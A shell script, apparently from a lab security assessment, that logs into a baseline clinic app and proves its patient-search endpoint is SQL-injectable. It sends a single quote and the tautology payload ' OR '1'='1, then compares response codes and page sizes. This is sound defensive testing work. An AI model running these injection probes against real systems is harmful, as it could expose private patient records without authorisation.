#!/bin/sh
# Manual proof that the BASELINE receptionist patient-search is SQL-injectable, where sqlmap at
# default --level/--risk only surfaced HTTP 500s. Lab use only. The hardened build parameterises the
# same query, so there pass S=https://HOST:5443 as the first arg's sibling to show it stays 200.
# Usage: sh search_injection_proof.sh <host-ip> ravi <ravi's baseline password>
H=${1:-192.168.56.1}; U=${2:-ravi}; P=$3
[ -n "$P" ] || { echo "usage: sh search_injection_proof.sh <host-ip> ravi <baseline password>" >&2; exit 2; }
B=http://$H:5444
E=$HOME/vapt-evidence; mkdir -p "$E"; OUT=$E/search_injection_proof.txt
: > "$OUT"

rm -f "$E/jar2"
code=$(curl -s -c "$E/jar2" -o /dev/null -w '%{http_code}' \
  --data-urlencode "username=$U" --data-urlencode "password=$P" "$B/login")
echo "login as $U: HTTP $code (302 = success)" | tee -a "$OUT"
[ "$code" = "302" ] || { echo "login failed; aborting" | tee -a "$OUT"; exit 1; }

# HTTP code + body size are template-agnostic: a parameterised query returns 200 for every input and
# a page sized to the matches; an unsafe concatenated query 500s on a lone quote and returns the
# full-table page (much larger than a no-match) for a tautology.
probe() {
  c=$(curl -s -b "$E/jar2" -o "$E/body.tmp" -w '%{http_code}' --get --data-urlencode "q=$1" "$B/patients/")
  echo "[$2] q=<$1> -> HTTP $c, body $(wc -c < "$E/body.tmp") bytes" | tee -a "$OUT"
}
probe "Sharma"       "benign surname"
probe "zzz_no_match" "benign no-match (smallest page)"
probe "'"            "single quote (unsafe query 500s here)"
probe "' OR '1'='1"  "tautology (unsafe query returns the full-table page)"
echo "---" | tee -a "$OUT"
echo "Injectable if the single quote 500s and the tautology page is much larger than the no-match page." | tee -a "$OUT"
rm -f "$E/body.tmp"
